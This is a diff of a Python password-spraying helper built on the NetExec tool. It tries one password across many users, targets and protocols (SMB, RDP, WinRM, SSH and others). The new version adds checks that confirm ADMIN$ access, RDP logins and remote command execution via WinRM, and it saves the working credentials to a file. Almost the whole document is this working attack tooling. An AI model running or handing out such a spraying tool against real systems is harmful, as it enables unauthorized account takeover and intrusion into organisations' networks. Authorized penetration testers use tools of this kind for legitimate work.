@@ -16,18 +16,13 @@ BOLD = "\033[1m"
 RESET = "\033[0m"
 
 ALL_PROTOCOLS = [
-    "ftp",
-    "smb",
-    "ldap",
-    "winrm",
-    "nfs",
-    "vnc",
-    "mssql",
-    "ssh",
-    "rdp",
-    "wmi",
+    "ftp", "smb", "ldap", "winrm", "nfs",
+    "vnc", "mssql", "ssh", "rdp", "wmi",
 ]
 
+# =====================
+# HELPERS
+# =====================
 def load_list(value):
     if not value:
         return []
@@ -36,18 +31,12 @@ def load_list(value):
     return [value]
 
 def run_nxc(proto, target, user, password, local_auth):
-    cmd = [
-        "nxc",
-        proto,
-        target,
-        "-u", user,
-        "-p", password
-    ]
-
+    cmd = ["nxc", proto, target, "-u", user, "-p", password]
     if local_auth:
         cmd.append("--local-auth")
 
     print(f"[+] Running: {' '.join(cmd)}")
+
     return subprocess.run(
         cmd,
         stdout=subprocess.PIPE,
@@ -56,76 +45,90 @@ def run_nxc(proto, target, user, password, local_auth):
     )
 
 def extract_success(output):
-    indicators = ["[+]", "Pwned", "SUCCESS"]
-    return any(ind in output for ind in indicators)
+    return "[+]" in output and "[-]" not in output
+
+# =====================
+# VALIDATION LOGIC
+# =====================
+def validate_access(proto, target, user, password):
+    try:
+        if proto == "rdp":
+            cmd = [
+                "xfreerdp",
+                f"/u:{user}",
+                f"/p:{password}",
+                f"/v:{target}",
+                "/cert:ignore",
+                "+auth-only"
+            ]
+            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+            if result.returncode == 0:
+                return True, "RDP login confirmed"
+
+        elif proto == "smb":
+            cmd = ["nxc", "smb", target, "-u", user, "-p", password, "--shares"]
+            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+            if "ADMIN$" in result.stdout:
+                return True, "ADMIN$ access confirmed"
+
+        elif proto == "winrm":
+            cmd = ["nxc", "winrm", target, "-u", user, "-p", password, "-x", "whoami"]
+            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+            if user.lower() in result.stdout.lower():
+                return True, "Command execution confirmed"
+
+    except Exception as e:
+        return False, f"Validation error: {e}"
+
+    return False, "No confirmed access"
 
 def explain_failure(output):
     explanations = []
 
-    if "ADMIN$" in output:
-        explanations.append(
-            "SMB auth succeeded but admin access blocked (likely UAC token filtering)"
-        )
     if "STATUS_LOGON_FAILURE" in output:
         explanations.append("Invalid credentials")
+
     if "STATUS_ACCOUNT_LOCKED_OUT" in output:
         explanations.append("Account locked out")
+
     if "Connection refused" in output:
         explanations.append("Service not reachable")
 
+    if "ADMIN$" in output:
+        explanations.append("SMB auth succeeded but admin blocked (UAC filtering)")
+
     return explanations
 
+# =====================
+# MAIN
+# =====================
 def main():
     parser = argparse.ArgumentParser(
-        description="NetExec multi-protocol password spraying helper"
+        description="NetExec multi-protocol password spraying helper (v2)"
     )
 
-    parser.add_argument(
-        "protocols",
-        help="Comma-separated protocols or 'all' (e.g. smb,ldap or all)"
-    )
-    parser.add_argument(
-        "target",
-        help="Target IP or file containing targets"
-    )
-    parser.add_argument(
-        "-u", "--user",
-        help="Single username"
-    )
-    parser.add_argument(
-        "-U", "--userfile",
-        help="File containing usernames"
-    )
-    parser.add_argument(
-        "-p", "--password",
-        required=True,
-        help="Password to spray"
-    )
-    parser.add_argument(
-        "--local-auth",
-        action="store_true",
-        help="Use local authentication"
-    )
-    parser.add_argument(
-        "--delay",
-        type=int,
-        default=0,
-        help="Delay in seconds between attempts"
-    )
-    parser.add_argument(
-        "--explain",
-        action="store_true",
-        help="Explain common failure reasons"
-    )
-    parser.add_argument(
-        "--no-color",
-        action="store_true",
-        help="Disable colored output"
-    )
+    parser.add_argument("protocols", help="Comma-separated protocols or 'all'")
+    parser.add_argument("target", help="Target IP or file")
+    parser.add_argument("-u", "--user", help="Single username")
+    parser.add_argument("-U", "--userfile", help="File of usernames")
+    parser.add_argument("-p", "--password", required=True)
+
+    parser.add_argument("--local-auth", action="store_true")
+    parser.add_argument("--delay", type=int, default=0)
+    parser.add_argument("--explain", action="store_true")
+    parser.add_argument("--no-color", action="store_true")
+
+    # NEW FLAGS
+    parser.add_argument("--validate", action="store_true",
+                        help="Validate real access (RDP/SMB/WinRM)")
+    parser.add_argument("--only-access", action="store_true",
+                        help="Only show confirmed access")
 
     args = parser.parse_args()
 
-    # Disable colors if requested
     global GREEN, YELLOW, RED, BOLD, RESET
     if args.no_color:
         GREEN = YELLOW = RED = BOLD = RESET = ""
@@ -134,15 +137,10 @@ def main():
         print("[-] Must supply -u or -U")
         sys.exit(1)
 
-    # Protocol handling
     if args.protocols == "all":
         protocols = ALL_PROTOCOLS
     else:
         protocols = [p.strip() for p in args.protocols.split(",")]
-        invalid = set(protocols) - set(ALL_PROTOCOLS)
-        if invalid:
-            print(f"[-] Invalid protocol(s): {', '.join(invalid)}")
-            sys.exit(1)
 
     targets = load_list(args.target)
     users = load_list(args.userfile) if args.userfile else [args.user]
@@ -156,21 +154,15 @@ def main():
     print(f"[+] Users     : {len(users)}")
     print(f"[+] Targets   : {len(targets)}")
     print(f"[+] Protocols : {', '.join(protocols)}")
-    print(f"[+] Delay     : {args.delay}s")
+    print(f"[+] Validation: {args.validate}")
     print(f"[+] Log file  : {logfile}\n")
 
     for user in users:
         for proto in protocols:
             print(f"{YELLOW}[+] === Protocol: {proto} | User: {user} ==={RESET}")
-            for target in targets:
-                result = run_nxc(
-                    proto,
-                    target,
-                    user,
-                    args.password,
-                    args.local_auth
-                )
 
+            for target in targets:
+                result = run_nxc(proto, target, user, args.password, args.local_auth)
                 output = result.stdout + result.stderr
 
                 with open(logfile, "a") as log:
@@ -178,8 +170,26 @@ def main():
 
                 if extract_success(output):
                     entry = f"{proto} {target} {user}:{args.password}"
+
+                    tag = "[VALID]"
+                    validation_msg = ""
+
+                    if args.validate:
+                        success, msg = validate_access(proto, target, user, args.password)
+
+                        if success:
+                            tag = "[ACCESS]"
+                            validation_msg = f" ({msg})"
+                        else:
+                            validation_msg = f" ({msg})"
+
+                    # ONLY ACCESS FILTER
+                    if args.only_access and tag != "[ACCESS]":
+                        continue
+
                     valid_creds.append(entry)
-                    print(f"{GREEN}{BOLD}[!] VALID → {entry}{RESET}")
+
+                    print(f"{GREEN}{BOLD}{tag} → {entry}{validation_msg}{RESET}")
 
                 elif args.explain:
                     reasons = explain_failure(output)
@@ -195,7 +205,7 @@ def main():
         with open(credsfile, "w") as f:
             f.write("\n".join(valid_creds))
 
-        print(f"{GREEN}{BOLD}[+] VALID CREDENTIALS FOUND ({len(valid_creds)}){RESET}")
+        print(f"{GREEN}{BOLD}[+] RESULTS ({len(valid_creds)}){RESET}")
         for cred in valid_creds:
             print(f"{GREEN}  → {cred}{RESET}")
 
@@ -204,6 +214,7 @@ def main():
         print(f"{RED}{BOLD}[-] No valid credentials found{RESET}")
 
     print("=" * 60)
+
 
 if __name__ == "__main__":
     main()
